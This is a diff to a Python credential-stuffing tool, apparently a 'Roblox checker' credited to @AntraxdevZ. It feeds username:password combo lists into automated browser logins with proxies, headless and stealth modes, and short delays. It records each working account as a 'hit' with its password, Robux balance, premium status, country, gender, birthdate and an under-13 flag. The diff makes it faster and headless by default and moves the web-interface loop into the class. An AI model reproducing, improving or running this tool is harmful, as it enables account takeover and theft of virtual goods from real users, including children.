@@ -1,5 +1,4 @@
-# checker.py - Modified to remove auto-install
-# checker.py - Fixed version without distutils
+# checker.py - Complete fixed version
 import os
 import sys
 import json
@@ -15,16 +14,15 @@ from typing import Dict, List, Optional, Tuple, Any
 from enum import Enum
 from dataclasses import dataclass, field
 
-# Add this to handle missing distutils in Python 3.12+
+# Fix for Python 3.12+
 try:
     import distutils
 except ImportError:
-    # Create dummy distutils module
     import types
     distutils = types.ModuleType('distutils')
     sys.modules['distutils'] = distutils
 
-# Now import selenium and other dependencies
+# Import dependencies
 try:
     from selenium import webdriver
     from selenium.webdriver.common.by import By
@@ -80,7 +78,6 @@ class Account:
     is_under_13: bool = False
     has_verified_badge: bool = False
     trade_count: int = 0
-    # Settings fields
     email_verified: bool = False
     phone_enabled: bool = False
     can_trade: bool = False
@@ -96,10 +93,8 @@ class Account:
     app_chat_enabled: bool = False
     parental_spend_controls: bool = False
     missing_parent_email: bool = False
-    # Country fields
     country_name: str = ""
     country_id: int = 0
-    # Metadata fields
     max_description_length: int = 0
     description_enabled: bool = False
     phone_number_enabled: bool = False
@@ -107,7 +102,6 @@ class Account:
     session_management: bool = False
     persona_id_verification: bool = False
     password_required_for_aging_down: bool = False
-    # Roblox badges
     roblox_badges: List[str] = field(default_factory=list)
 
 
@@ -199,24 +193,6 @@ class DriverManager:
             return True
         except Exception as e:
             print(f"[-] Webdriver-manager failed: {e}")
-            print("[!] Trying manual paths...")
-            
-            common_paths = [
-                r"C:\chromedriver\chromedriver.exe",
-                r"C:\Windows\System32\chromedriver.exe",
-                os.path.join(os.getcwd(), "chromedriver.exe"),
-                os.path.join(os.path.expanduser("~"), "chromedriver.exe")
-            ]
-            
-            for path in common_paths:
-                if os.path.exists(path):
-                    self.driver_path = path
-                    print(f"[+] Found ChromeDriver at: {self.driver_path}")
-                    return True
-            
-            print("[-] ChromeDriver not found!")
-            print("[!] Please download ChromeDriver from: https://chromedriver.chromium.org/")
-            print("[!] Place it in C:\\chromedriver\\chromedriver.exe or current directory")
             return False
     
     def create_driver(self, mode: VerificationMode, proxy: str = None, worker_id: int = 0):
@@ -720,9 +696,9 @@ class AntraxRblxChecker:
         self.driver_manager = DriverManager()
         self.api_lookup = RobloxAPILookup()
         
-        self.mode = VerificationMode.NORMAL
-        self.min_delay = 5.0
-        self.max_delay = 10.0
+        self.mode = VerificationMode.HEADLESS
+        self.min_delay = 2.0
+        self.max_delay = 5.0
         self.max_workers = 2
         self.max_accounts_per_test = 999999
         
@@ -907,6 +883,7 @@ class AntraxRblxChecker:
             self.logger.error(f"Error processing valid account: {e}")
     
     def save_hit(self, account: Account):
+        gender_map = {1: "Male", 2: "Female"}
         try:
             with open('valid_result.txt', 'a', encoding='utf-8') as f:
                 f.write("=" * 80 + "\n")
@@ -940,7 +917,6 @@ class AntraxRblxChecker:
                     f.write("  No items currently wearing\n")
                 
                 f.write("\n--- GENDER & BIRTHDATE ---\n")
-                gender_map = {1: "Male", 2: "Female"}
                 f.write(f"GENDER: {gender_map.get(account.gender, 'Unknown')}\n")
                 if account.birthdate:
                     bd = account.birthdate
@@ -952,7 +928,7 @@ class AntraxRblxChecker:
                 else:
                     f.write("BIRTHDATE: Not set\n")
                 
-                f.write("\n--- ACCOUNT SETTINGS (from /my/settings/json) ---\n")
+                f.write("\n--- ACCOUNT SETTINGS ---\n")
                 f.write(f"EMAIL VERIFIED: {'YES' if account.email_verified else 'NO'}\n")
                 f.write(f"PHONE ENABLED: {'YES' if account.phone_enabled else 'NO'}\n")
                 f.write(f"CAN TRADE: {'YES' if account.can_trade else 'NO'}\n")
@@ -969,11 +945,11 @@ class AntraxRblxChecker:
                 f.write(f"PARENTAL SPEND CONTROLS: {'YES' if account.parental_spend_controls else 'NO'}\n")
                 f.write(f"MISSING PARENT EMAIL: {'YES' if account.missing_parent_email else 'NO'}\n")
                 
-                f.write("\n--- ACCOUNT COUNTRY (from /v1/account/settings/account-country) ---\n")
+                f.write("\n--- ACCOUNT COUNTRY ---\n")
                 f.write(f"COUNTRY: {account.country_name if account.country_name else 'Unknown'}\n")
                 f.write(f"COUNTRY ID: {account.country_id if account.country_id else 'N/A'}\n")
                 
-                f.write("\n--- ACCOUNT METADATA (from /v1/metadata) ---\n")
+                f.write("\n--- ACCOUNT METADATA ---\n")
                 f.write(f"MAX DESCRIPTION LENGTH: {account.max_description_length}\n")
                 f.write(f"DESCRIPTION ENABLED: {'YES' if account.description_enabled else 'NO'}\n")
                 f.write(f"PHONE NUMBER ENABLED: {'YES' if account.phone_number_enabled else 'NO'}\n")
@@ -982,7 +958,7 @@ class AntraxRblxChecker:
                 f.write(f"PERSONA FOR ID VERIFICATION: {'YES' if account.persona_id_verification else 'NO'}\n")
                 f.write(f"PASSWORD REQUIRED FOR AGING DOWN: {'YES' if account.password_required_for_aging_down else 'NO'}\n")
                 
-                f.write("\n--- ROBLOX BADGES (from /v1/users/{id}/roblox-badges) ---\n")
+                f.write("\n--- ROBLOX BADGES ---\n")
                 if account.roblox_badges:
                     for badge in account.roblox_badges:
                         badge_name = badge.get('name', 'Unknown Badge') if isinstance(badge, dict) else str(badge)
@@ -1003,14 +979,6 @@ class AntraxRblxChecker:
                 f.write(f"{account.username}:{account.password} | R${account.robux:,} | {'PREMIUM' if account.premium else 'NORMAL'} | Age: {account.account_age} | Friends: {account.friends} | Trade Count: {account.trade_count} | Country: {account.country_name} | Gender: {gender_map.get(account.gender, 'Unknown')} | {under_13_flag}\n")
             
             self.stats['valid'] += 1
-            
-            premium_tag = " [PREMIUM]" if account.premium else ""
-            high_value_tag = " [HIGH VALUE]" if account.robux > 1000 else ""
-            robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
-            country_tag = f" | {account.country_name}" if account.country_name else ""
-            gender_tag = f" | {'Male' if account.gender == 1 else 'Female' if account.gender == 2 else ''}" if account.gender else ""
-            under_13_tag = " | Under 13" if account.age_bracket == 1 else ""
-            self.recent_results.append(('HIT', account.username, f"{robux_tag}{premium_tag}{high_value_tag}{country_tag}{gender_tag}{under_13_tag}", account.status))
             
         except Exception as e:
             self.logger.error(f"Error saving hit: {e}")
@@ -1437,251 +1405,123 @@ class AntraxRblxChecker:
         
         print("=" * 70)
 
-
-def show_banner():
-    print("=" * 70)
-    print("   ATX ROBLOX CHECKER")
-    print("   Created by: @AntraxdevZ")
-    print("=" * 70)
-
-
-def get_input(prompt, default=None, input_type=str):
-    while True:
-        value = input(prompt)
-        if not value.strip() and default is not None:
-            return default
-        try:
-            return input_type(value.strip())
-        except ValueError:
-            print(f"[-] Invalid input. Please enter a valid {input_type.__name__}.")
-
-
-def start_verification_simple(self):
-    """Simple single-threaded verification for web interface"""
-    if not self.accounts:
-        print("[-] No accounts to verify")
-        self.recent_results.append("[-] No accounts to verify")
-        return
-    
-    self.running = True
-    self.recent_results = []
-    self.all_results = []
-    
-    total = len(self.accounts[:self.max_accounts_per_test])
-    
-    print(f"\n[+] Starting verification of {total} accounts...")
-    print(f"[+] Mode: {self.mode.value}")
-    print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
-    print("-" * 50)
-    
-    self.stats['start_time'] = time.time()
-    
-    for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
-        if not self.running:
-            print("[!] Stopped by user")
-            self.recent_results.append("[!] Stopped by user")
-            break
+    # ========== NEW METHOD FOR WEB INTERFACE ==========
+    def start_verification_simple(self):
+        """Simple single-threaded verification for web interface"""
+        if not self.accounts:
+            print("[-] No accounts to verify")
+            self.recent_results.append("[-] No accounts to verify")
+            return
         
-        print(f"[{idx}/{total}] Checking: {account.username}")
+        self.running = True
+        self.recent_results = []
+        self.all_results = []
         
-        # Verify the account
-        result = self.verify_account(account, idx)
+        total = len(self.accounts[:self.max_accounts_per_test])
         
-        # Update stats
-        self.stats['verified'] += 1
+        print(f"\n[+] Starting verification of {total} accounts...")
+        print(f"[+] Mode: {self.mode.value}")
+        print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
+        print("-" * 50)
         
-        # Handle result
-        if result.status == 'valid':
-            self.stats['valid'] += 1
-            if result.premium:
-                self.stats['premium_accounts'] += 1
-            if result.robux > 0:
-                self.stats['total_robux'] += result.robux
-            if result.robux > 1000 or result.premium:
-                self.stats['high_value_accounts'] += 1
-            
-            # Save hit
-            self.save_hit(result)
-            
-            # Add to recent results
-            hit_msg = f"[HIT] {result.username} | R${result.robux}"
-            if result.premium:
-                hit_msg += " [PREMIUM]"
-            if result.country_name:
-                hit_msg += f" | {result.country_name}"
-            self.recent_results.append(hit_msg)
-            print(f"  ✅ {hit_msg}")
-            
-        elif result.status == 'invalid_password':
-            self.stats['wrong_password'] += 1
-            msg = f"[WRONG] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  ❌ {msg}")
-            
-        elif result.status == 'captcha':
-            self.stats['captcha'] += 1
-            msg = f"[CAPTCHA] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  🤖 {msg}")
-            
-        elif result.status == 'timeout':
-            self.stats['timeout'] += 1
-            msg = f"[TIMEOUT] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  ⏱️ {msg}")
-            
-        elif result.status == 'rate_limit':
-            self.stats['rate_limit'] += 1
-            msg = f"[RATE] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  ⚠️ {msg}")
-            
-        elif result.status == 'blocked':
-            self.stats['blocked'] += 1
-            msg = f"[BLOCKED] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  🚫 {msg}")
-            
-        elif result.status == 'driver_error':
-            self.stats['driver_error'] += 1
-            msg = f"[DRIVER] {result.username}"
-            self.recent_results.append(msg)
-            print(f"  ⚠️ {msg}")
-            
-        else:
-            self.stats['other_errors'] += 1
-            msg = f"[ERROR] {result.username}: {result.message[:30]}"
-            self.recent_results.append(msg)
-            print(f"  ❌ {msg}")
+        self.stats['start_time'] = time.time()
         
-        # Keep only last 50 results
-        if len(self.recent_results) > 50:
-            self.recent_results = self.recent_results[-50:]
-        
-        # Update stats for web
-        self.stats['recent_results'] = self.recent_results[-10:]
-        
-        # Delay between checks
-        if idx < total and self.running:
-            delay = random.uniform(self.min_delay, self.max_delay)
-            time.sleep(delay)
-    
-    # Show final summary
-    print("\n" + "=" * 50)
-    print("[+] VERIFICATION COMPLETE")
-    print(f"[+] Total checked: {self.stats['verified']}")
-    print(f"[+] Valid hits: {self.stats['valid']}")
-    print(f"[+] Premium: {self.stats['premium_accounts']}")
-    print(f"[+] Total Robux: {self.stats['total_robux']:,}")
-    print(f"[+] High value: {self.stats['high_value_accounts']}")
-    print("=" * 50)
-    
-def main():
-    show_banner()
-    
-    install_dependencies()
-    
-    print("\n" + "-" * 70)
-    print("CONFIGURATION")
-    print("-" * 70)
-    
-    while True:
-        combo_file = input("\n[?] Enter combo file path (user:pass format): ").strip()
-        if os.path.exists(combo_file):
-            break
-        print(f"[-] File not found: {combo_file}")
-        print("[!] Please enter a valid file path.")
-    
-    max_workers = get_input("[?] How many threads? (1-10, default=3): ", default=3, input_type=int)
-    if max_workers < 1:
-        max_workers = 1
-    if max_workers > 10:
-        max_workers = 10
-        print("[!] Max threads limited to 10 for stability")
-    
-    min_delay = get_input("[?] Minimum delay between checks (seconds, default=5): ", default=5, input_type=float)
-    max_delay = get_input("[?] Maximum delay between checks (seconds, default=10): ", default=10, input_type=float)
-    
-    if min_delay < 1:
-        min_delay = 1
-    if max_delay < min_delay:
-        max_delay = min_delay + 2
-        print(f"[!] Adjusted max delay to {max_delay}")
-    
-    print("\n[?] Verification mode:")
-    print("    1. Normal (Recommended - visible browser)")
-    print("    2. Headless (Faster - no UI)")
-    print("    3. Stealth (Anti-detection)")
-    print("    4. Rapid (Less delay between actions)")
-    mode_choice = get_input("    Choose (1-4, default=1): ", default=1, input_type=int)
-    
-    mode_map = {
-        1: VerificationMode.NORMAL,
-        2: VerificationMode.HEADLESS,
-        3: VerificationMode.STEALTH,
-        4: VerificationMode.RAPID
-    }
-    mode = mode_map.get(mode_choice, VerificationMode.NORMAL)
-    
-    use_proxy = get_input("\n[?] Use proxies? (y/n, default=n): ", default='n')
-    proxies_file = None
-    if use_proxy.lower() == 'y':
-        while True:
-            proxies_file = input("[?] Enter proxy file path: ").strip()
-            if os.path.exists(proxies_file):
+        for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
+            if not self.running:
+                print("[!] Stopped by user")
+                self.recent_results.append("[!] Stopped by user")
                 break
-            print(f"[-] File not found: {proxies_file}")
-            print("[!] Press Enter to skip proxies, or enter valid path.")
-            if not proxies_file:
-                proxies_file = None
-                break
-    
-    account_limit = get_input("\n[?] Max accounts to check (0=all, default=0): ", default=0, input_type=int)
-    if account_limit == 0:
-        account_limit = 999999
-    
-    print("\n" + "-" * 70)
-    print("CONFIGURATION SUMMARY")
-    print("-" * 70)
-    print(f"Combo file:      {combo_file}")
-    print(f"Threads:         {max_workers}")
-    print(f"Delay:           {min_delay}-{max_delay} seconds")
-    print(f"Mode:            {mode.value}")
-    print(f"Proxies:         {proxies_file if proxies_file else 'None'}")
-    print(f"Account limit:   {'All' if account_limit >= 999999 else account_limit}")
-    print("-" * 70)
-    
-    confirm = get_input("\n[?] Start verification? (y/n, default=y): ", default='y')
-    if confirm.lower() != 'y':
-        print("[!] Cancelled.")
-        sys.exit(0)
-    
-    checker = AntraxRblxChecker()
-    
-    checker.mode = mode
-    checker.min_delay = min_delay
-    checker.max_delay = max_delay
-    checker.max_workers = max_workers
-    checker.max_accounts_per_test = account_limit
-    
-    if not checker.load_accounts(combo_file):
-        print("[-] Failed to load accounts. Exiting.")
-        sys.exit(1)
-    
-    if proxies_file:
-        checker.load_proxies(proxies_file)
-    
-    try:
-        checker.start_verification()
-    except KeyboardInterrupt:
-        print("\n[!] Stopped by user")
-        checker.running = False
-    
-    print("\n[+] Done! Check output files:")
-    print("    - valid_result.txt (Complete account information with settings)")
-    print("    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")
-    print("    - hits_summary.txt (Quick summary)")
-
-
-if __name__ == "__main__":
-    main()
+            
+            print(f"[{idx}/{total}] Checking: {account.username}")
+            
+            # Verify the account
+            result = self.verify_account(account, idx)
+            
+            # Update stats
+            self.stats['verified'] += 1
+            
+            # Handle result
+            if result.status == 'valid':
+                self.stats['valid'] += 1
+                if result.premium:
+                    self.stats['premium_accounts'] += 1
+                if result.robux > 0:
+                    self.stats['total_robux'] += result.robux
+                if result.robux > 1000 or result.premium:
+                    self.stats['high_value_accounts'] += 1
+                
+                # Save hit
+                self.save_hit(result)
+                
+                # Add to recent results
+                hit_msg = f"[HIT] {result.username} | R${result.robux}"
+                if result.premium:
+                    hit_msg += " [PREMIUM]"
+                if result.country_name:
+                    hit_msg += f" | {result.country_name}"
+                self.recent_results.append(hit_msg)
+                print(f"  ✅ {hit_msg}")
+                
+            elif result.status == 'invalid_password':
+                self.stats['wrong_password'] += 1
+                msg = f"[WRONG] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  ❌ {msg}")
+                
+            elif result.status == 'captcha':
+                self.stats['captcha'] += 1
+                msg = f"[CAPTCHA] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  🤖 {msg}")
+                
+            elif result.status == 'timeout':
+                self.stats['timeout'] += 1
+                msg = f"[TIMEOUT] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  ⏱️ {msg}")
+                
+            elif result.status == 'rate_limit':
+                self.stats['rate_limit'] += 1
+                msg = f"[RATE] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  ⚠️ {msg}")
+                
+            elif result.status == 'blocked':
+                self.stats['blocked'] += 1
+                msg = f"[BLOCKED] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  🚫 {msg}")
+                
+            elif result.status == 'driver_error':
+                self.stats['driver_error'] += 1
+                msg = f"[DRIVER] {result.username}"
+                self.recent_results.append(msg)
+                print(f"  ⚠️ {msg}")
+                
+            else:
+                self.stats['other_errors'] += 1
+                msg = f"[ERROR] {result.username}: {result.message[:30]}"
+                self.recent_results.append(msg)
+                print(f"  ❌ {msg}")
+            
+            # Keep only last 50 results
+            if len(self.recent_results) > 50:
+                self.recent_results = self.recent_results[-50:]
+            
+            # Update stats for web
+            self.stats['recent_results'] = self.recent_results[-10:]
+            
+            # Delay between checks
+            if idx < total and self.running:
+                delay = random.uniform(self.min_delay, self.max_delay)
+                time.sleep(delay)
+        
+        # Show final summary
+        print("\n" + "=" * 50)
+        print("[+] VERIFICATION COMPLETE")
+        print(f"[+] Total checked: {self.stats['verified']}")
+        print(f"[+] Valid hits: {self.stats['valid']}")
+        print(f"[+] Premium: {self.stats['premium_accounts']}")
+        print(f"[+] Total Robux: {self.stats['total_robux']:,}")
+        print(f"[+] High value: {self.stats['high_value_accounts']}")
+        print("=" * 50)
